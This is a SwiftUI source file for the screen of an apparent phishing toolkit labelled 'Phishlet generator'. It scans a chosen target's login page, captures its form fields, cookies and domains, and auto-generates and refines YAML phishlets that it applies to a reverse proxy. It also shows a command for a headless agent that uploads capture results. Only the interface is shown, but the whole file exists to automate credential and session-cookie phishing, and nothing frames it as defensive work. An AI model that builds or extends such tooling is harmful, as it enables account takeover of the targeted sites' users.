import SwiftUI

// MARK: - Recon Screen

struct ReconScreen: View {
    @State private var vm = ReconViewModel()
    @State private var copiedField: String?

    var body: some View {
        NavigationStack {
            ZStack {
                GatewayTheme.bg.ignoresSafeArea()

                ScrollView {
                    VStack(alignment: .leading, spacing: GatewayTheme.spacing(4)) {
                        headerSection
                        targetSelector
                        loginAutomatorSection
                        headlessAgentSection
                        pipelineProgress
                        capturedIntelligence
                        generatedYamlSection
                        refinedYamlSection
                    }
                    .padding(.horizontal, GatewayTheme.spacing(4))
                    .padding(.top, GatewayTheme.spacing(6))
                    .padding(.bottom, GatewayTheme.spacing(12))
                }
                .scrollIndicators(.hidden)

                LinearGradient(
                    colors: [GatewayTheme.accentGlow, Color.clear],
                    startPoint: UnitPoint(x: 0.1, y: 0),
                    endPoint: UnitPoint(x: 0.9, y: 0.5)
                )
                .frame(height: 300)
                .allowsHitTesting(false)
                .ignoresSafeArea()
            }
            .task { await vm.load() }
        }
    }

    private var headerSection: some View {
        VStack(alignment: .leading, spacing: GatewayTheme.spacing(1.5)) {
            Text("RECONNAISSANCE").eyebrowStyle()
            Text("Phishlet generator")
                .font(.system(size: 28, weight: .heavy))
                .foregroundStyle(GatewayTheme.text)
                .tracking(-0.5)
            Text("One tap to scan a target, capture its login flow, and auto-generate a refined YAML phishlet with multi-pass validation.")
                .font(.system(size: 13))
                .foregroundStyle(GatewayTheme.textDim)
                .lineSpacing(4)
        }
    }

    // MARK: Target Selector

    private var targetSelector: some View {
        VStack(spacing: GatewayTheme.spacing(3)) {
            Text("TARGET").fieldLabelStyle()

            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: GatewayTheme.spacing(2)) {
                    ForEach(vm.proxies, id: \.slug) { proxy in
                        Button {
                            vm.selectedSlug = proxy.slug
                            vm.reset()
                        } label: {
                            HStack(spacing: GatewayTheme.spacing(1.5)) {
                                Image(systemName: "globe").font(.system(size: 11))
                                Text(proxy.name.isEmpty ? proxy.slug : proxy.name)
                                    .monoFont(size: 12, weight: .semibold)
                                    .lineLimit(1)
                            }
                            .foregroundStyle(vm.selectedSlug == proxy.slug ? GatewayTheme.warn : GatewayTheme.textFaint)
                            .padding(.horizontal, GatewayTheme.spacing(3))
                            .padding(.vertical, GatewayTheme.spacing(2))
                            .background(
                                vm.selectedSlug == proxy.slug
                                    ? GatewayTheme.warn.opacity(0.1)
                                    : GatewayTheme.bgElevated
                            )
                            .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                            .overlay(
                                RoundedRectangle(cornerRadius: GatewayTheme.radiusSm)
                                    .stroke(
                                        vm.selectedSlug == proxy.slug ? GatewayTheme.warn : GatewayTheme.border,
                                        lineWidth: 1
                                    )
                            )
                        }
                    }
                }
            }

            if vm.selectedProxy != nil {
                Button {
                    Task { await vm.startScan() }
                } label: {
                    HStack(spacing: GatewayTheme.spacing(2)) {
                        if vm.stage != .idle, vm.stage != .done {
                            ProgressView().scaleEffect(0.7).tint(GatewayTheme.bg)
                        } else {
                            Image(systemName: "dot.radiowaves.left.and.right")
                        }
                        Text(vm.stage == .done ? "Rescan" : (vm.stage == .idle ? "Run scan" : vm.stage.label))
                    }
                    .font(.system(size: 14, weight: .heavy))
                    .foregroundStyle(GatewayTheme.bg)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, GatewayTheme.spacing(3.5))
                    .background(vm.stage != .idle && vm.stage != .done ? GatewayTheme.accent.opacity(0.7) : GatewayTheme.accent)
                    .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                }
                .disabled(vm.stage != .idle && vm.stage != .done)
                .accessibilityLabel(vm.stage == .idle ? "Run scan" : "Rescan")
            }
        }
        .padding(GatewayTheme.spacing(4))
        .cardSurface()
    }

    // MARK: Login Automator

    @ViewBuilder
    private var loginAutomatorSection: some View {
        if vm.selectedProxy != nil {
            VStack(alignment: .leading, spacing: GatewayTheme.spacing(3)) {
                Text("LOGIN PHISHLET AUTOMATOR").fieldLabelStyle()

                HStack(spacing: GatewayTheme.spacing(2)) {
                    TextField("https://target.com/login", text: $vm.loginUrl)
                        .font(.system(size: 14, design: .monospaced))
                        .foregroundStyle(GatewayTheme.text)
                        .padding(GatewayTheme.spacing(3))
                        .background(GatewayTheme.surface)
                        .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                        .overlay(RoundedRectangle(cornerRadius: GatewayTheme.radiusSm).stroke(GatewayTheme.border, lineWidth: 1))
                        .autocapitalization(.none)
                        .autocorrectionDisabled()
                        .keyboardType(.URL)

                    Button {
                        vm.startLoginScan()
                    } label: {
                        HStack(spacing: GatewayTheme.spacing(1.5)) {
                            if vm.isGeneratingLogin {
                                ProgressView().scaleEffect(0.6).tint(GatewayTheme.bg)
                            } else {
                                Image(systemName: "fingerprint").font(.system(size: 14))
                                Text("Generate")
                            }
                        }
                        .font(.system(size: 14, weight: .heavy))
                        .foregroundStyle(GatewayTheme.bg)
                        .padding(.horizontal, GatewayTheme.spacing(4))
                        .padding(.vertical, GatewayTheme.spacing(2.5))
                        .background(GatewayTheme.accent)
                        .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                    }
                    .disabled(vm.loginUrl.trimmingCharacters(in: .whitespaces).isEmpty || vm.isGeneratingLogin)
                }

                if !vm.loginYaml.isEmpty {
                    VStack(alignment: .leading, spacing: GatewayTheme.spacing(2)) {
                        HStack {
                            Text("Generated YAML")
                                .font(.system(size: 12, weight: .bold))
                                .foregroundStyle(GatewayTheme.text)
                            Spacer()
                            copyButton("loginYaml")
                        }
                        Text("Applied to proxy: \(vm.selectedProxy?.name ?? vm.selectedProxy?.slug ?? "")")
                            .monoFont(size: 10)
                            .foregroundStyle(GatewayTheme.ok)
                        Text(vm.loginYaml)
                            .monoFont(size: 10)
                            .foregroundStyle(GatewayTheme.textDim)
                            .lineLimit(12)
                            .lineSpacing(4)
                    }
                    .padding(GatewayTheme.spacing(3))
                    .background(GatewayTheme.bgElevated)
                    .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                    .overlay(RoundedRectangle(cornerRadius: GatewayTheme.radiusSm).stroke(GatewayTheme.border, lineWidth: 1))
                } else if vm.loginMode {
                    HStack(spacing: GatewayTheme.spacing(2)) {
                        ProgressView().scaleEffect(0.7).tint(GatewayTheme.accent)
                        Text("Navigating and probing login form…")
                            .monoFont(size: 12)
                            .foregroundStyle(GatewayTheme.textDim)
                    }
                    .padding(.vertical, GatewayTheme.spacing(2))
                }
            }
            .padding(GatewayTheme.spacing(4))
            .cardSurface()
        }
    }

    // MARK: Headless Agent

    @ViewBuilder
    private var headlessAgentSection: some View {
        if vm.selectedProxy != nil {
            VStack(alignment: .leading, spacing: GatewayTheme.spacing(3)) {
                Text("HEADLESS AGENT").fieldLabelStyle()
                Text("Run the Puppeteer agent locally and have it upload the result back to this proxy.")
                    .font(.system(size: 13))
                    .foregroundStyle(GatewayTheme.textDim)
                    .lineSpacing(4)

                Button {
                    Task {
                        await vm.prepareAgentCommand()
                        vm.showAgentCommand.toggle()
                    }
                } label: {
                    HStack(spacing: GatewayTheme.spacing(1.5)) {
                        Image(systemName: "server.rack").font(.system(size: 14))
                        Text(vm.showAgentCommand ? "Hide command" : "Show command")
                            .font(.system(size: 12, weight: .bold))
                    }
                    .foregroundStyle(GatewayTheme.text)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, GatewayTheme.spacing(2.5))
                    .background(GatewayTheme.bgElevated)
                    .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                    .overlay(RoundedRectangle(cornerRadius: GatewayTheme.radiusSm).stroke(GatewayTheme.border, lineWidth: 1))
                }

                if vm.showAgentCommand, !vm.agentCommand.isEmpty {
                    VStack(alignment: .leading, spacing: GatewayTheme.spacing(2)) {
                        HStack {
                            Text("Terminal command")
                                .font(.system(size: 12, weight: .bold))
                                .foregroundStyle(GatewayTheme.text)
                            Spacer()
                            copyButton("agentCommand")
                        }
                        Text(vm.agentCommand)
                            .monoFont(size: 10)
                            .foregroundStyle(GatewayTheme.cyan)
                            .lineSpacing(4)
                        Text("Set GATEWAY_API_KEY in your terminal first, then paste and run.")
                            .monoFont(size: 10)
                            .foregroundStyle(GatewayTheme.textFaint)
                            .lineSpacing(4)
                    }
                    .padding(GatewayTheme.spacing(3))
                    .background(GatewayTheme.bgElevated)
                    .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                    .overlay(RoundedRectangle(cornerRadius: GatewayTheme.radiusSm).stroke(GatewayTheme.border, lineWidth: 1))
                }
            }
            .padding(GatewayTheme.spacing(4))
            .cardSurface()
        }
    }

    // MARK: Pipeline Progress

    @ViewBuilder
    private var pipelineProgress: some View {
        if vm.stage != .idle {
            let stages: [ReconStage] = [.scanning, .generating, .iterating, .done]
            HStack(spacing: 0) {
                ForEach(stages.indices, id: \.self) { i in
                    let stage = stages[i]
                    let passed = stagePassed(stage)
                    let current = vm.stage == stage
                    VStack(spacing: GatewayTheme.spacing(1.5)) {
                        ZStack {
                            Circle()
                                .stroke(current ? stage.color : (passed ? GatewayTheme.ok : GatewayTheme.border), lineWidth: 2)
                                .frame(width: 20, height: 20)
                                .background(
                                    Circle()
                                        .fill(current ? stage.color : (passed ? GatewayTheme.ok : GatewayTheme.bgElevated))
                                        .frame(width: 16, height: 16)
                                )
                            if passed {
                                Image(systemName: "checkmark")
                                    .font(.system(size: 8, weight: .bold))
                                    .foregroundStyle(GatewayTheme.bg)
                            } else if current {
                                ProgressView()
                                    .scaleEffect(0.35)
                                    .tint(GatewayTheme.bg)
                            }
                        }
                        Text(stage == .scanning ? "Capture" : stage == .generating ? "Generate" : stage == .iterating ? "Refine" : "Done")
                            .monoFont(size: 9, weight: .bold)
                            .foregroundStyle(current || passed ? (passed ? GatewayTheme.ok : stage.color) : GatewayTheme.textFaint)
                            .kerning(0.5)
                    }
                    if i < stages.count - 1 {
                        Spacer()
                    }
                }
            }
            .padding(.horizontal, GatewayTheme.spacing(4))
            .padding(.vertical, GatewayTheme.spacing(3))
            .background(GatewayTheme.surface)
            .clipShape(.rect(cornerRadius: GatewayTheme.radiusMd))
            .overlay(RoundedRectangle(cornerRadius: GatewayTheme.radiusMd).stroke(vm.stage.color, lineWidth: 1))
        }
    }

    private func stagePassed(_ s: ReconStage) -> Bool {
        switch (s, vm.stage) {
        case (.scanning, .generating), (.scanning, .iterating), (.scanning, .done): return true
        case (.generating, .iterating), (.generating, .done): return true
        case (.iterating, .done): return true
        default: return false
        }
    }

    // MARK: Captured Intelligence

    @ViewBuilder
    private var capturedIntelligence: some View {
        if vm.stage != .idle {
            VStack(alignment: .leading, spacing: GatewayTheme.spacing(3)) {
                HStack(spacing: GatewayTheme.spacing(2)) {
                    Image(systemName: "fingerprint")
                        .font(.system(size: 14))
                        .foregroundStyle(vm.stage == .scanning ? GatewayTheme.cyan : GatewayTheme.accent)
                    Text("Captured intelligence")
                        .font(.system(size: 14, weight: .bold))
                        .foregroundStyle(GatewayTheme.text)
                    Spacer()
                    if vm.stage == .scanning {
                        PulseDotView(color: GatewayTheme.cyan, isActive: true, size: 8)
                    }
                }
                if let cap = vm.capturedData {
                    if let title = cap.pageTitle {
                        Label(title, systemImage: "globe")
                            .monoFont(size: 11)
                            .foregroundStyle(GatewayTheme.textDim)
                            .lineLimit(1)
                    }
                    HStack(spacing: GatewayTheme.spacing(2)) {
                        miniMetric("URLs", cap.urls?.count ?? 0)
                        miniMetric("Fields", cap.formFields?.count ?? 0)
                        miniMetric("Cookies", cap.cookies?.count ?? 0)
                        miniMetric("Domains", cap.domains?.count ?? 0)
                    }
                } else {
                    HStack(spacing: GatewayTheme.spacing(2)) {
                        ProgressView().scaleEffect(0.6).tint(GatewayTheme.cyan)
                        Text("Listening for capture data…")
                            .monoFont(size: 12)
                            .foregroundStyle(GatewayTheme.textDim)
                    }
                }
            }
            .padding(GatewayTheme.spacing(4))
            .cardSurface()
        }
    }

    private func miniMetric(_ label: String, _ value: Int) -> some View {
        VStack(spacing: 2) {
            Text("\(value)")
                .monoFont(size: 14, weight: .bold)
                .foregroundStyle(GatewayTheme.accent)
            Text(label)
                .monoFont(size: 8)
                .foregroundStyle(GatewayTheme.textFaint)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, GatewayTheme.spacing(1.5))
        .background(GatewayTheme.bgElevated)
        .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
    }

    // MARK: Generated YAML

    @ViewBuilder
    private var generatedYamlSection: some View {
        if !vm.generated.isEmpty {
            VStack(alignment: .leading, spacing: GatewayTheme.spacing(3)) {
                HStack(spacing: GatewayTheme.spacing(2)) {
                    Image(systemName: "wand.and.stars")
                        .font(.system(size: 14))
                        .foregroundStyle(GatewayTheme.warn)
                    Text("Generated phishlet")
                        .font(.system(size: 14, weight: .bold))
                        .foregroundStyle(GatewayTheme.text)
                }
                ScrollView(.horizontal, showsIndicators: false) {
                    Text(vm.generated)
                        .monoFont(size: 10)
                        .foregroundStyle(GatewayTheme.text)
                        .lineSpacing(4)
                }
                .frame(maxHeight: 200)

                Button {
                    copy(vm.generated, "gen")
                } label: {
                    HStack(spacing: GatewayTheme.spacing(1.5)) {
                        if copiedField == "gen" {
                            Image(systemName: "checkmark").font(.system(size: 12)).foregroundStyle(GatewayTheme.ok)
                            Text("Copied").font(.system(size: 11, weight: .bold)).foregroundStyle(GatewayTheme.ok)
                        } else {
                            Image(systemName: "doc.on.doc").font(.system(size: 12)).foregroundStyle(GatewayTheme.accent)
                            Text("Copy YAML").font(.system(size: 11, weight: .bold)).foregroundStyle(GatewayTheme.accent)
                        }
                    }
                    .padding(.horizontal, GatewayTheme.spacing(3))
                    .padding(.vertical, GatewayTheme.spacing(2))
                    .background(GatewayTheme.bgElevated)
                    .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                    .overlay(RoundedRectangle(cornerRadius: GatewayTheme.radiusSm).stroke(GatewayTheme.border, lineWidth: 1))
                }
                .accessibilityLabel("Copy generated YAML to clipboard")
            }
            .padding(GatewayTheme.spacing(4))
            .cardSurface()
        }
    }

    // MARK: Refined YAML

    @ViewBuilder
    private var refinedYamlSection: some View {
        if let iterate = vm.iterateResult, !vm.refinedYaml.isEmpty {
            VStack(alignment: .leading, spacing: GatewayTheme.spacing(3)) {
                HStack(spacing: GatewayTheme.spacing(2)) {
                    Image(systemName: "shield.checkered")
                        .font(.system(size: 14))
                        .foregroundStyle(GatewayTheme.ok)
                    Text("Refined phishlet")
                        .font(.system(size: 14, weight: .bold))
                        .foregroundStyle(GatewayTheme.text)
                    Spacer()
                    Text("\(iterate.score)/100")
                        .monoFont(size: 11, weight: .heavy)
                        .foregroundStyle(GatewayTheme.text)
                        .padding(.horizontal, GatewayTheme.spacing(2))
                        .padding(.vertical, 2)
                        .background(iterate.score >= 80 ? GatewayTheme.ok.opacity(0.12) : GatewayTheme.warn.opacity(0.12))
                        .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                        .overlay(
                            RoundedRectangle(cornerRadius: GatewayTheme.radiusSm)
                                .stroke(iterate.score >= 80 ? GatewayTheme.ok.opacity(0.35) : GatewayTheme.warn.opacity(0.35), lineWidth: 1)
                        )
                }

                Text("\(iterate.passes) pass\(iterate.passes != 1 ? "es" : "") · \(iterate.critiques.count) finding\(iterate.critiques.count != 1 ? "s" : "") · \(iterate.improvements.count) improvement\(iterate.improvements.count != 1 ? "s" : "")")
                    .monoFont(size: 11)
                    .foregroundStyle(GatewayTheme.textFaint)

                if !iterate.critiques.isEmpty {
                    VStack(spacing: GatewayTheme.spacing(2)) {
                        ForEach(iterate.critiques.indices, id: \.self) { i in
                            let c = iterate.critiques[i]
                            HStack(alignment: .top, spacing: GatewayTheme.spacing(2)) {
                                Circle()
                                    .fill(c.severity == "critical" ? GatewayTheme.danger : c.severity == "warning" ? GatewayTheme.warn : GatewayTheme.accent)
                                    .frame(width: 7, height: 7)
                                    .padding(.top, 4)
                                VStack(alignment: .leading, spacing: 2) {
                                    Text(c.finding)
                                        .font(.system(size: 11))
                                        .foregroundStyle(GatewayTheme.textDim)
                                    Text(c.fix)
                                        .monoFont(size: 10)
                                        .foregroundStyle(GatewayTheme.accent)
                                }
                            }
                        }
                    }
                }

                ScrollView(.horizontal, showsIndicators: false) {
                    Text(vm.refinedYaml)
                        .monoFont(size: 10)
                        .foregroundStyle(GatewayTheme.text)
                        .lineSpacing(4)
                }
                .frame(maxHeight: 200)

                Button {
                    copy(vm.refinedYaml, "refined")
                } label: {
                    HStack(spacing: GatewayTheme.spacing(1.5)) {
                        if copiedField == "refined" {
                            Image(systemName: "checkmark").font(.system(size: 12)).foregroundStyle(GatewayTheme.ok)
                            Text("Copied").font(.system(size: 11, weight: .bold)).foregroundStyle(GatewayTheme.ok)
                        } else {
                            Image(systemName: "doc.on.doc").font(.system(size: 12)).foregroundStyle(GatewayTheme.accent)
                            Text("Copy refined YAML").font(.system(size: 11, weight: .bold)).foregroundStyle(GatewayTheme.accent)
                        }
                    }
                    .padding(.horizontal, GatewayTheme.spacing(3))
                    .padding(.vertical, GatewayTheme.spacing(2))
                    .background(GatewayTheme.bgElevated)
                    .clipShape(.rect(cornerRadius: GatewayTheme.radiusSm))
                    .overlay(RoundedRectangle(cornerRadius: GatewayTheme.radiusSm).stroke(GatewayTheme.border, lineWidth: 1))
                }
                .accessibilityLabel("Copy refined YAML to clipboard")
            }
            .padding(GatewayTheme.spacing(4))
            .cardSurface()
        }
    }

    // MARK: Copy

    private func copy(_ value: String, _ field: String) {
        UIPasteboard.general.string = value
        copiedField = field
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.4) {
            if copiedField == field { copiedField = nil }
        }
    }

    private func copyButton(_ field: String) -> some View {
        Button {
            switch field {
            case "loginYaml": copy(vm.loginYaml, field)
            case "agentCommand": copy(vm.agentCommand, field)
            default: break
            }
        } label: {
            Image(systemName: copiedField == field ? "checkmark" : "doc.on.doc")
                .font(.system(size: 14))
                .foregroundStyle(copiedField == field ? GatewayTheme.ok : GatewayTheme.cyan)
        }
        .accessibilityLabel("Copy \(field)")
    }
}
